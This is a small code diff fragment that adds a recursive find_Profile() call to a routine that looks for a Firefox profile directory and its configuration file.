@@ -298,6 +298,8 @@ path = mozpath + "\\.mozilla\\firefox\\why.kek";
   bool flag = findmoz_ini();
      if(flag == true)
         {
+        //recursively call
+            find_Profile();
             return true;
         }
         else
